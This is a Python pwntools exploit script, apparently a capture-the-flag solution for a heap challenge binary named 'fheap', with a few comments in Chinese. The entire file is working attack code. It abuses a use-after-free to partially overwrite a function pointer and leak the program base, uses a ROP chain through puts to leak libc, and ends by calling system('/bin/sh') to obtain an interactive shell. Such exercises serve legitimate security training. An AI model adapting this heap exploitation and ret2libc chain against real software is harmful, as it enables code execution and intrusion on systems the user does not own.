#! /usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux','splitw','-h']
elf = ELF('./fheap')
# libc = ELF('libc.so.6')
libc = elf.libc
p=process('./fheap')

def create(size, s):
    p.recvuntil('quit\n')
    p.sendline('create ')
    p.recvuntil('size:')
    p.sendline(str(size))
    p.recvuntil('str:')
    p.send(s+b'\x00')

def delete(index):
    p.recvuntil('quit\n')
    p.sendline('delete ')
    p.recvuntil('id:')
    p.sendline(str(index))
    p.recvuntil('sure?:')
    p.sendline('yes')

def debug():
    gdb.attach(p)
    pause()


create(15,b'aaa\n')# 0 10
create(15,b'bbb\n')# 1 10
create(15,b'ccc\n')# 2 10

delete(2)
delete(1)
delete(0)

create(0x20, b'a'*24 + b'\x1a')# 0 0x30 没有 \x00 截断，就会发生魔法，跟 strncpy 有关
# create(0x20, b'1'*24 + p64(0xd2d))# 0 0x30

delete(1)
debug()
p.recvuntil('a'*24)
elf_base = u64(p.recv(6).ljust(8, b'\x00')) - 0xd1a
log.success('elf_base: ' + hex(elf_base))
elf.address = elf_base
puts_plt = elf.plt['puts']
log.success('puts_plt: ' + hex(puts_plt))
puts_got = elf.got['puts']
log.success('puts_got: ' + hex(puts_got))
rdi_addr = elf_base + 0x11e3
log.success('rdi_addr: ' + hex(rdi_addr))
pop4_addr = elf_base + 0x11dc
log.success('pop4_rdi: ' + hex(pop4_addr))
ret_addr = elf_base + 0x949

delete(0)

payload = 0x18 * b'a'
payload += p64(pop4_addr)# gdb 看一下
create(0x20,payload)


p.recvuntil('quit\n')
p.sendline('delete ')
p.recvuntil('id:')
p.sendline(str(1))
p.recvuntil('sure?:')
temp = b'yesaaaaa'
temp += p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(ret_addr)
temp += p64(0xC71+elf.address)

p.sendline(temp)

puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.success('puts_addr: ' + hex(puts_addr))
libc.address = puts_addr - libc.sym['puts']
system_addr = libc.sym['system']
log.success('system_addr: ' + hex(system_addr))
binsh_addr = next(libc.search(b'/bin/sh'))
log.success('binsh_addr: ' + hex(binsh_addr))


delete(0)
payload = 0x18*b'a'
payload += p64(pop4_addr)
create(0x20,payload)

p.recvuntil('quit\n')
p.sendline('delete ')
p.recvuntil('id:')
p.sendline(str(1))
p.recvuntil('sure?:')
temp = b'yesaaaaa'
temp += p64(rdi_addr) + p64(binsh_addr) + p64(ret_addr) + p64(system_addr)

p.sendline(temp)
p.interactive()